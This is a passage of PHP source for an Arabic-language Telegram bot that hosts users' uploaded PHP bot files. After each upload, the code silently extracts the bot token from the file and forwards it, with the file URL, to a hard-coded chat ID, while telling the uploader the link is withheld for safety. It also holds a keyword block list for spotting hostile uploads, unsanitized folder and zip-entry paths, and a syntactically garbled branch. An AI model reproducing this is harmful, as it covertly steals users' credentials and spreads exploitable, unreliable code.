     [['text'=>"⦅ تقييم البوت ⭐ ⦆",'callback_data'=>"tqeemat" ],['text'=>"⦅ سرعة الاستضافة ✨ ⦆",'callback_data'=>"bing" ]], 
     [['text'=>"⦅ حاجاتي 📂 ⦆",'callback_data'=>"show" ]], 
     [['text'=>"⦅ فك ضغط ملف 📮 ⦆",'callback_data'=>"zip" ],['text'=>"⦅ انشاء فولدر 📂 ⦆",'callback_data'=>"uploadD" ]],
     [['text'=>"⦅ تعديل ملف 📝 ⦆",'callback_data'=>"Editfile" ]],
     [['text'=>"⦅ المطور 👨🏻‍💻 ⦆",'url'=>"https://t.me/T_0_M0" ],['text'=>" ⦅ قناة المطور 🔥 ⦆",'url'=>"https://t.me/izeoe" ]], 
     [['text'=>"⦅ قسم الويب هوك ⦆",'callback_data'=>"exit" ]],
     
      ]
    ])
            ]);
  }
 } 
 
 if($data == "back") {
 	bot("editMessagetext",[
                "chat_id" => $chat_id, 
                "message_id" => $message_id, 
                "text" => "*☆︙مرحبا بك* [$name](tg://user?id=$from_id) في بوت
*☆︙رفع الملفات عل الاستضافه 
☆︙ملفاتك المرفوعه ⦅ $counts ⦆
☆︙عدد جميع ملفات المرفوعه ⦅ $vc ⦆
☆︙عدد مستخدمين البوت ⦅ $SAl ⦆
☆︙تعليمات البوت ⦅ /help ⦆*

             [تابع قناة تحديثات البوت](https://t.me/izeoe)",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ رفع الملف 📤 ⦆",'callback_data'=>"SendFile"]],
     [['text'=>"⦅ تحديث البوت ♻️ ⦆",'callback_data'=>"refr" ],['text'=>"⦅ احصائيات الرفع 📊 ⦆",'callback_data'=>"nas" ]], 
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
     [['text'=>"⦅ تقييم البوت ⭐ ⦆",'callback_data'=>"tqeemat" ],['text'=>"⦅ سرعة الاستضافة ✨ ⦆",'callback_data'=>"bing" ]], 
     [['text'=>"⦅ حاجاتي 📂 ⦆",'callback_data'=>"show" ]], 
     [['text'=>"⦅ فك ضغط ملف 📮 ⦆",'callback_data'=>"zip" ],['text'=>"⦅ انشاء فولدر 📂 ⦆",'callback_data'=>"uploadD" ]],
     [['text'=>"⦅ تعديل ملف 📝 ⦆",'callback_data'=>"Editfile" ]],
     [['text'=>"⦅ المطور 👨🏻‍💻 ⦆",'url'=>"https://t.me/T_0_M0" ],['text'=>" ⦅ قناة المطور 🔥 ⦆",'url'=>"https://t.me/izeoe" ]], 
     [['text'=>"⦅ قسم الويب هوك ⦆",'callback_data'=>"exit" ]],
     
      ]
    ])
            ]);
        $UploadEr["المود"][$from_id] = null ;
        SETJSON($UploadEr) ;
} 
 


 if($data == "contact") {
 	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
            *
⏎︙ارسل رسالتك
*
" ,
            "parse_mode" => "markdown",
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ رجوع ⦆",'callback_data'=>"back" ]], 
      ]
    ])
        ]);
        $UploadEr["المود"][$from_id] = "twsl" ;
        SETJSON($UploadEr) ;
} 
if(preg_match("/Rd_/", $text) and $chat_id == $admin) {
		$chat=explode("_", $text)[1];
		$msg=explode("_", $text)[2];
		bot("sendmessage",[
                "chat_id" => $admin , 
                "text" => "
📶] ارسل الان الرساله
            🔖] يتم ارسالها الى
 
[$from_id](tg://user?id=$chat) 
[Acount](tg://openmessage?user_id=$chat) 
                ",
                'parse_mode'=>"markdown",
            ]);
            $UploadEr["المود"][$from_id] = "Rd_".$chat."_".$msg."" ;
        SETJSON($UploadEr) ;
        return false ;
		} 
		
		if (preg_match("/Rd_/", $UploadEr["المود"][$from_id] ) && $chat_id == $admin) {
    $chat = explode("_", $UploadEr["المود"][$from_id])[1];
    $msg = explode("_", $UploadEr["المود"][$from_id])[2];
    bot("sendmessage", [
        "chat_id" => $admin,
        "text" => "*⏎︙تم ايصال رسالتك*",
        'parse_mode' => "markdown",
    ]);
    $b=bot("sendmessage", [
        "chat_id" => $chat,
        "text" => $text,
        "reply_to_message_id" => $msg, 
        'parse_mode' => "markdown",
    ]);
    bot("sendmessage", [
        "chat_id" => $chat,
        "text" => "*⏎︙هذا رساله من الدعم لارسال الرسائل اضغط على الزر ادناه*" ,
        "reply_to_message_id" => $b->result->message_id, 
        'parse_mode' => "markdown",
        'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ ارسال رساله ⦆",'callback_data'=>"contact" ]], 
      ]
    ])
    ]);
    
    return false ;
}
if($text and $UploadEr["المود"][$from_id] == "twsl") {
	bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "*
⏎︙تم ارسال رسالتك سنجاوب عليك في اقرب وقت ونحل مشكلتك
                *",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ لانهاء ارسال الرسائل ⦆",'callback_data'=>"back" ]], 
      ]
    ])
            ]);
            $u = $message_id;
            bot("sendmessage",[
                "chat_id" => $admin , 
                "text" => "
📶] تم ارسال رساله جديده

ℹ️] $text 

            🔖] من $name
 
[$from_id](tg://user?id=$chat_id) 
[Acount](tg://openmessage?user_id=$chat_id) 

للرد علي رساله الشخص [/Rd_".$from_id."_".$u."]
                ",
                'parse_mode'=>"markdown",
            ]);
            
	} 
$folderData = json_decode(file_get_contents('folder.json'), true);
$p = $chat_id;
if (isset($folderData[$p])) {
    $folder_id = $folderData[$p];
} else {
    $folder_id = 'bots';
    $folderData[$p] = $folder_id;
    file_put_contents('folder.json', json_encode($folderData));
}
 mkdir($chat_id);
if ($data == 'show') {
    $dir = "";
    $file = "";
    $ss = __DIR__;
    $al = scandir($ss);
    foreach ($al as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (is_dir($ss . "/" . $item)) {
            $dir .= "- $item 📂\n";

            // List files inside the directory
            $files_in_dir = scandir($ss . "/" . $item);
            foreach ($files_in_dir as $file_in_dir) {
                if ($file_in_dir == '.' || $file_in_dir == '..') {
                    continue;
                }
                if (is_file($ss . "/" . $item . "/" . $file_in_dir)) {
                    $dir .= "  - $file_in_dir 📃\n";
                }
            }
        } elseif (is_file($ss . "/" . $item)) {
            $file .= "- $item 📃\n";
        } }
    $d = 1;
    $f = 1;
    $dirs = "- المجلدات 📂؛\n";
    $all = count(array_diff(scandir($ss), array('..', '.')));
    $files = "- الملفات 📃\n ";
    foreach (scandir($ss) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (is_dir($ss . "/" . $item)) {
            $dirs .= "*$d-* `$item`\n";
            $d += 1;
        }
        if (is_file($ss . "/" . $item)) {
            $files .= "*$f-* `$item`\n";
            $f += 1;
        }
    }

    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "• العدد الكلي: $all\n\n$dirs\n`$dir`\n-----------\n$files`$file`",
        'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⦅ رجــوع ⦆' ,'callback_data'=>"back"]],
]
])
    ]);
}


//////
if ($data == 'uploadD') {
    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => '- قم بأرسال اسم المجلد ، ',
        'parse_mode' => 'markdown',
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => '⦅ رجــوع ⦆', 'callback_data' => 'back']]
            ]
        ])
    ]);

    $filess['mode'] = 'uploadD';
    save($filess);
    exit;
}

///

$ss = __DIR__;
if ($data == 'hiring') {
    $buttons = [];
    $folders = [];

    $al = scandir($ss);
    foreach ($al as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (is_dir($ss . "/" . $item)) {
            $folders[] = $item; // قم بتخزين أسماء المجلدات
        }
    }

    // إنشاء الأزرار باستخدام أسماء المجلدات
    foreach ($folders as $folder) {
        $buttons[] = [
            ['text' => $folder, 'callback_data' => "folder_$folder"]
        ];
    }
$backButton = [
    ['text' => '⦅ رجــوع ⦆', 'callback_data' => 'back']
];

// دمج زر "⦅ رجــوع ⦆" مع مصفوفة الأزرار
$buttons[] = $backButton;

    // تنسيق الأزرار في الصيغة المطلوبة
    $keyboard = json_encode([
        'inline_keyboard' => $buttons
    ]);

    // إرسال الرسالة مع الأزرار
    bot("editMessagetext",[
        'chat_id' => $chat_id, 
        'message_id' => $message_id, 
        'text' => 'يرجى اختيار المجلد : ',
        'parse_mode' => 'markdown',
        'reply_markup' => $keyboard
    ]);

        $filess['mode'] = 'hiring';
    save($filess);
    exit;
}
$ss = __DIR__;
///@@@@@@@@@///

/////

if ($filess['mode'] == 'hiring') {
$folder_name = str_replace('folder_', '', $data);
if (is_dir(__DIR__ . '/' . $folder_name)) {
    $folderData = json_decode(file_get_contents('folder.json'), true);
    $folderData[$chat_id] = $folder_name;
    file_put_contents('folder.json', json_encode($folderData));
        bot("editMessagetext",[
         'chat_id' => $chat_id, 
         'message_id' => $message_id, 
         'text' => "- تم التغيير للمجلد بنجاح ✅؛ *$folder_name* ",
         'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⦅ رجــوع ⦆' ,'callback_data'=>"back"]],
]
])
        ]);
        save(clear($filess));
   } else {
   bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "- لا يوجد مجلد بالاسم  *$folder_name* ",
            'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⦅ رجــوع ⦆' ,'callback_data'=>"back"]],
]
])
        ]);
        save(clear($filess));
  }
}

/////

if ($filess['mode'] == 'uploadD') {
    if (mkdir(__DIR__ . '/' . $text)) {
    $folderData = json_decode(file_get_contents('folder.json'), true);
    $folderData[$chat_id] = $text;
    file_put_contents('folder.json', json_encode($folderData));
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "- تم الانشاء بنجاح ✅؛ *$text* ",
            'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⦅ رجــوع ⦆' ,'callback_data'=>"back"]],
]
])
        ]);
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "- المجلد موجود من قبل !! 🚫؛ *$text*",
            'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'⦅ رجــوع ⦆' ,'callback_data'=>"back"]],
]
])
        ]);
    }
    save(clear($filess));
}

/////



////////

///////
if ($data == "newfile") {
    bot("editMessagetext",[
        "chat_id" => $chat_id, 
        "message_id" => $message_id, 
        "text" => "*☆︙يرجى إرسال الكود*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [ 
                [['text' => "⦅ رجــوع ⦆", 'callback_data' => "back"]],
            ]
        ])
    ]);

}
//////////
if ($data == "Editfile") {

    bot("editMessagetext",[
        "chat_id" => $chat_id, 
        "message_id" => $message_id, 
        "text" => "*☆︙يرجى إرسال الملف 
        
#ملاحظه عند تعديل الملف لا تحتاج الى عمل ويبهوك بشرط ارسال الملف بنفس الاسم وتعيين المجلد الذي يوجد به الملف القديم ✅.*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [ 
                [['text' => "⦅ رجــوع ⦆", 'callback_data' => "back"]],
            ]
        ])
    ]);
}
///////////
if ($data == "bing") {
$b=bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "تم البدء بقياس السرعه ✅",
        'parse_mode' => "Markdown",
    ]);
    sleep(1);
    
    $userb = strtoupper($userbot);

    $start_time = microtime(true);

    
        
    
    for ($i = 0; $i < 11; $i++) {
        bot("editMessageText", [
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id,
            "text" => "
            *
            ♻️ يتم قياس السرعه انتظر قليلا...
            " . $i * 10 . "%
            *
            ",
            "parse_mode" => "Markdown",
        ]);
    }

    $end_time = microtime(true);
    if ($i >= 10) {
        bot("editMessageText", [
            "chat_id" => $chat_id,
            'message_id' =>  $b->result->message_id,
            "text" => "
            *
            ✨ تم الانتهاء من قياس السرعه ✓
            *
            ",
            "parse_mode" => "Markdown",
            
        ]);
        sleep(1);
    }
    $execution_time = $end_time - $start_time;
    $execution_time = number_format($execution_time, 4, '.', '');
    if ($execution_time <= 1.5) {
        $f = "سريعه 💯🔥";
    }
    if ($execution_time <= 3 && $execution_time > 1.5) {
        $f = "متوسطة 🙂";
    }
    if ($execution_time > 3) {
        $f = "ضعيفة جدا 💔";
    }

    bot("editMessageText", [
        "chat_id" => $chat_id,
        'message_id' =>  $b->result->message_id,
        'text' => "
        ✬ سرعة البوت ⋙ $execution_time 
         $f
        ",
        'parse_mode' => "Markdown",
    ]);
}
//===============//
if($update){
bot("setMyCommands",[
    "commands"=>json_encode([
        ['command'=>"start",'description'=>'تشغيل البوت ✅'],
  ['command'=>"help",'description'=>'تعليمات البوت مهمه ❗'],
  ['command'=>"Tom",'description'=>'تفعيل عضويه البوت 🔥'],
  ['command'=>"admin",'description'=>'خاص للمالك 🌚'],
        ])
    ]); 
}
#كود طرد من مجموعه البوت
$mnnlo = json_decode(file_get_contents("mnnlo.json"),1);
$tc = $update->message->chat->type;
if($tc == 'group' or $tc == 'supergroup'){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لا يمكنك استخدام البوت في مجموعات 🚫",
]);
bot('LeaveChat',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
}
if($text == "/help") {
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/gey9e/6",
'caption'=>"*❍︙تعليمات البوت كالاتي :
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
❍ لا تقم برفع الملف مكرر مرتين الا بعد 
حذف الملف من الاستضافة
❍ عند رفع الملف قم بعمل ويب هوك
لكي يتم تشغيل البوت
❍ لا تقم برفع الملفات فيها اختراق او ما شابه لان البوت سيحظرك تلقائيا
❍ اذا قمت برفع الملف والبوت لم يشتغل قم باستبدال فاكشن الاتصال وقم برفع الملف
مرة اخرى
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
❍︙نتمنى لكم كل التوفيق ♡.*",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
[['text'=>"⦅ قناة البوت ⦆",'url'=>'https://t.me/izeoe']],
[['text'=>"⦅ المطور ⦆",'url'=>'https://t.me/T_0_M0']],
]
])
]);
}
 if($update->message->document){
    $file_id = "https://api.telegram.org/file/bot".API_KEY."/".bot("getfile",["file_id"=>$update->message->document->file_id])->result->file_path;
    if(pathinfo($file_id, PATHINFO_EXTENSION) == "php"){
    	$b=bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "
            *
📊] يتم التحليل انتضر قليلا..
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
$rand = rand(1,99999999999);
        mkdir($chat_id);
    	$ur = "https://" . $domin . "ahmedpro23.serv00.net" . str_replace("tttaaa.php", null, $_SERVER['SCRIPT_NAME']) . "$folder_id/" . str_replace(".php", null, $update->message->document->file_name) . ".php";
    $text = file_get_contents ($file_id);
   
$document = $message->document;
$document_file_id = $document->file_id;
$urld = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getFile?file_id='.$document_file_id),true);
$pth = $urld['result']['file_path'];
$f = file_get_contents('https://api.telegram.org/file/bot'.API_KEY.'/'.$pth);
mkdir('check');
file_put_contents("check/$chat_id.php", file_get_contents ($file_id));
$true = file_get_contents("check/$chat_id.php");
$count = explode("\n",$true);
$count = count($count);
preg_match('/(.*)ZipArchive(.*)/',$f,$r1);
preg_match('/(.*)zip(.*)/',$f,$r2);
preg_match('/(.*)eval(.*)/',$f,$r3);
preg_match('/(.*)\.php(.*)/',$f,$r4);
preg_match('/(.*)base64(.*)/',$f,$r5);
preg_match('/(.*)base64_decode(.*)/',$f,$r6);
preg_match('/(.*)github(.*)/',$f,$r7);
preg_match('/(.*)eval(.*)/',$f,$r8);
preg_match('/(.*)public function create(.*)/',$f,$r9);
preg_match('/(.*)\.Php(.*)/',$f,$r10);
preg_match('/(.*)\.pHp(.*)/',$f,$r11);
preg_match('/(.*)\.phP(.*)/',$f,$r12);
preg_match('/(.*)\.PHp(.*)/',$f,$r13);
preg_match('/(.*)\.pHP(.*)/',$f,$r14);
preg_match('/(.*)\.PhP(.*)/',$f,$r15);
preg_match('/(.*)\.zip(.*)/',$f,$r16);
preg_match('/(.*)\.proc_open(.*)/',$f,$r17);
preg_match('/(.*)\.DIR(.*)/',$f,$r18);
preg_match('/(.*)\.dev-(.*)/',$f,$r19);
preg_match('/(.*)\.assert(.*)/',$f,$r20);
preg_match('/(.*)\.zipFile(.*)/',$f,$r21);
preg_match('/(.*)\.zipFolder(.*)/',$f,$r22);
if($count < 100){
    if($r1 or $r2 or $r3 or $r4 or $r5 or $r6 or $r7 or $r8 or $r9 or $r10 or $r11 or $r12 or $r13 or $r14 or $r15 or $r16 or$r17 or $r18 or $r19 or $r20 or $r21 or $r22){
unlink("check/$chat_id.php");
bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id, 
            "text" => "*
☢️ تم حظرك بسبب رفع ملفات محظوره !؟
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
        bot("sendmessage",[
            "chat_id" =>$admin,
            "text" => "
            *
#️⃣] محاوله اختراق
            *
            📇] من $name
 
[$from_id](tg://user?id=$chat_id) 
[Acount](tg://openmessage?user_id=$chat_id) 
" ,
            "parse_mode" => "marKdown",
            
        ]);
        $UploadEr[] = $from_id ;
        $UploadEr["filehc"] += 1 ;
        SETJSON($UploadEr) ; 
    return false;
}}
if($count > 100){
unlink("check/$chat_id.php");
    if (strip_tags($f) && preg_match("/H3K/", $f) && preg_match("/public function create/", $f) && preg_match('/(.*)ZipArchive(.*)/i', $f) && preg_match('/(.*)zip(.*)/i', $f) || preg_match('/(.*)eval(.*)/i', $f) || preg_match('/(.*)file_put_contents(.*)/i', $f) && preg_match('/(.*)file_get_contents(.*)/i', $f) && preg_match('/(.*)echo(.*)/i', $f) && preg_match('/(.*)Done Upload File on XN.php file(.*)/i', $f) || preg_match('/(.*)file_get_contents(.*)/i', $f)) {
 bot("editMessagetext",[     file_get_contents
bot('editMessageText',[
    "chat_id" => $chat_id,
    "message_id" => $b->result->message_id,
    "text" => "☢️ تم حظرك بسبب رفع ملفات محظوره !؟\n🚫 تم تعطيل حسابك"
]);
            "parse_mode" => "marKdown",            
        ]);
        bot("sendmessage",[
            "chat_id" =>$admin,
            "text" => "
            *
#️⃣] محاوله اختراق
            *
            📇] من $name
 
[$from_id](tg://user?id=$chat_id) 
[Acount](tg://openmessage?user_id=$chat_id) 
" ,
            "parse_mode" => "marKdown",
            
        ]);
        $UploadEr[] = $from_id ;
        $UploadEr["filehc"] += 1 ;
        SETJSON($UploadEr) ; 
    return false;
}}

bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $b->result->message_id, 
            "text" => "
<s>☆︙ يتم التحليل انتظر قليلاً..</s>
☆︙تم الرفع بنجاح 
☆︙اسم الملف الخاص بك ⦅". $update->message->document->file_name. "⦆
" ,
            "parse_mode" => "html",
        ]);
$ok = str_replace(".php",null,$update->message->document->file_name);
 mkdir("$folder_id") ;
$DIR = __DIR__;
$ur2 =$ur;
$urs = $ur;
$ur = $ur2;
$botname = $ok . ".php";
mkdir($folder_id);
        file_put_contents("$folder_id/$botname", file_get_contents ($file_id)) ;
$pattern = '/(\d+:[\w-]+)/';
if(preg_match("/api.telegram.org/", file_get_contents ($file_id))) {
	$UploadEr["FileMatch"] += 1;
	} else {
		$UploadEr["unFileMatch"] += 1;
		} 		
		if (strpos(file_get_contents ($file_id), 'curl_') !== false) {
	$UploadEr["curlfile"] += 1;
	} 
if (preg_match($pattern, file_get_contents ($file_id), $matches)) {
    $token = "$matches[0]" ;
    $n = $matches[0];
    $sethock = ["عمل ويبهوك تلقائي", "ازاله الويبهوك"] ;
} else {
	$token = "تعذر علي وجود توكن البوت" ;	
}
        $cr = rand(9999,999999);
        bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "☆︙تم رفع الملف بنجاح ♡. 

☆︙رابط الملف ⦅ لا يسمح بارساله للامان ⦆

☆︙توكن البوت ⦅$token ⦆" ,
         'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ $sethock[0] ⦆",'callback_data'=>"sethock|$cr" ]], 
     [['text'=>"⦅ حذف الملف من الاستضافه ⦆",'callback_data'=>"deletefile|$cr|$rand" ]], 
     [['text'=>"⦅ $sethock[1] ⦆",'callback_data'=>"delete|$cr" ]], 
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
 
      ]
    ])
        ]);
        bot("sendmessage",[
            "chat_id" => 5564378935 ,
            "text" => "☆︙قام شخص برفع ملف على الاستضافه ♡. 

☆︙يوزر البوت ⦅ $user ⦆

☆︙رابط الملف ⦅ $urs ⦆

☆︙اسم الملف ⦅ $ok ⦆

☆︙توكن البوت ⦅ $token ⦆" ,
            
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ $sethock[0] ⦆",'callback_data'=>"sethock|$cr" ]], 
     [['text'=>"⦅ حذف الملف من الاستضافه ⦆",'callback_data'=>"deletefile|$cr|$rand" ]], 
     [['text'=>"⦅ $sethock[1] ⦆",'callback_data'=>"delete|$cr" ]], 
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
       
      ]
    ])
        ]);
        $UploadEr["count$from_id"] += 1;
        $UploadEr["count"] += 1;
        $UploadEr["meFile"][$from_id][] = $update->message->document->file_name;
        $UploadEr[$cr] = "$n|$ur|".$update->message->document->file_name;
        SETJSON($UploadEr) ;
    }else{
    	bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" => "☆︙قم بارسال ملفات بصيغه ⦅ php ⦆ فقط" ,
            "parse_mode" => "marKdown",
            
        ]);
   }}
$da = explode ("|", $data) ;
if($da[0] == "sethock") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $UploadEr[$cr])[0];
		$ul = explode("|", $UploadEr[$cr])[1];
		file_get_contents("https://api.telegram.org/bot$tk/setwebhook?url=$ul") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خاطء في الملف") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
☆︙تم عمل ويبهوك تلقائي 
☆︙معرف البوت الخاص بك : ⦅ $user ⦆
",
      'show_alert'=>true
      ]);
    }}
	if($da[0] == "delete") {
	if($da[1] !=null) {
		$cr = $da[1];
		$tk = explode("|", $UploadEr[$cr])[0];
		$ul = explode("|", $UploadEr[$cr])[1];
		file_get_contents("https://api.telegram.org/bot$tk/deleteWebhook") ;
		$user = "@".(json_decode(file_get_contents("https://api.telegram.org/bot$tk/getme"))->result->username?? "يبدو ان التوكن خاطء في الملف") ;
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
☆︙تم ازاله الويبهوك علي البوت 
☆︙معرف البوت الخاص بك : ⦅ $user ⦆
",
      'show_alert'=>true
      ]);
     }}	
if($da[0] == "deletefile") {
    if($da[1] != null) {
        $cr = $da[1];
        $tk = explode("|", $UploadEr[$cr])[0];
        $ul = explode("|", $UploadEr[$cr])[1];
        $nmv = str_replace(".php", null, explode("|", $UploadEr[$cr])[2]);
        
        // حذف المجلد إذا كان موجودا
        $folder_path = __DIR__ . "/$chat_id/$nmv";
        if (file_exists($folder_path)) {
            // حذف الملفات داخل المجلد
            $files = glob("$folder_path/*");
            foreach($files as $file){
                if(is_file($file))
                    unlink($file);
 }
            rmdir($folder_path);
            unset($UploadEr[$cr]);
            SETJSON($UploadEr);
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
🗑️︙تم حذف الملف بنجاح
",
                'show_alert'=>true
            ]);
        } else {
            // إرسال رسالة بأن الملف تم حذفه من قبل
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
✅︙الملف تم حذفه من قبل
",
                'show_alert'=>true
            ]);
  }}}
if($data == "deleteall") {
        // حذف المجلد إذا كان موجودا
        $folder_path = __DIR__ . "/$chat_id";
        if (file_exists($folder_path)) {
    // العثور على جميع المجلدات الفرعية
    $subfolders = glob("$folder_path/*", GLOB_ONLYDIR);
    
    // حذف الملفات داخل كل مجلد فرعي والمجلد نفسه
    foreach ($subfolders as $subfolder) {
        $files = glob("$subfolder/*");
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }
        rmdir($subfolder);
    }
    $files = glob("$folder_path/*");
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
  } }
    rmdir($folder_path);
$UploadEr["count"] = 0; 
$UploadEr["count$from_id"] = 0;
SETJSON($UploadEr);
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
✅︙تم حذف جميع ملفاتك بنجاح 
",
                'show_alert'=>true
            ]);
        } else {      
        $UploadEr["count$from_id"] = 0;
        SETJSON($UploadEr);            
            bot('answerCallbackQuery',[
                'callback_query_id'=>$update->callback_query->id,
                'text'=>"
تم حذف جميع ملفاتك من قبل لا توجد ملفات حاليا 
",
                'show_alert'=>true
            ]);
   }}
if (isset($update->message->text)) {
        $chat_id = $update->message->chat->id;
        $message_text = $update->message->text;
        if (strpos($message_text, "<?php") === 0) {
            $php_content = substr($message_text, 5);
            $random_filename = uniqid() . ".php";
            file_put_contents($random_filename, $php_content);
            sendDocument($chat_id, $random_filename);
   }}

if($data == 'zip'){
		bot('editMessageText',[
			"chat_id"=>$chat_id,
			'message_id'=>$message_id,
			"text"=>"قم بأرسال الملف zip",
            "parse_mode" => "markdown",
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [["text"=>"- الصفحه الرئيسيه -","callback_data"=>"back"]], 
      ]
    ])
		]);
		$files['mode'][$chat_id] = 'zip';
		save($files);
		exit;
	}
if($message->document) {
if (preg_match('/(.*)\.(zip)/i', $message->document->file_name)) {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'يتم فك الضغط'
]);
mkdir($chat_id);
file_put_contents($chat_id.'/'.$message->document->file_name, file_get_contents('https://api.telegram.org/file/bot'.API_KEY.'/'.bot('getfile',['file_id'=>$message->document->file_id])->result->file_path));
$zip = zip_open($chat_id.'/'.$message->document->file_name);
if ($zip){
while ($zip_entry = zip_read($zip)) {
if (zip_entry_open($zip, $zip_entry)){
file_put_contents($chat_id.'/'.zip_entry_name($zip_entry), zip_entry_read($zip_entry));
bot('sendDocument',[
'chat_id'=>$chat_id,
'document'=>new CURLFile($chat_id.'/'.zip_entry_name($zip_entry))
]);
zip_entry_close($zip_entry);
}
}
}
zip_close($zip);
$sc = scandir($chat_id);
for ($i=0; $i < count($sc); $i++) { 
unlink($chat_id.'/'.$sc[$i]);
}
rmdir($chat_id);
} else {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>''
]);
}
}
////

if($data == "SendFile"){
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>"*
ارسل الملف الآن 
*", 
'reply_to_message_id'=>$message->message_id, 
  'parse_mode'=>'MARKDOWN',
  'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"⦅ رجوع ⦆","callback_data"=>"back"]],
]])
]);
}


?>